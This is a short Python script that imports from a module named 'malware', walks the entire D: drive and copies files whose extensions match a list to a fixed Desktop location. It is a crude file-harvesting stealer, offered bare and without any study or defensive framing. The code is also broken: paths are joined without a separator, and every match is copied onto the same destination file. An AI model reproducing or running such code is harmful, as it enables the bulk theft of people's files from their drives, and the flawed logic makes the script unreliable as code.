import shutil
from malware import*
import os
target = r"E:\the meat"
for dirpath , dirname , filenames in os.walk(r'D:\\'):
        for file in filenames:
            full_dir = dirpath+file
            if file.endswith(tuple(ex_list)):
                try:
                    shutil.copyfile(full_dir, r'C:\Users\USER\Desktop\beef')
                except FileNotFoundError:
                    pass




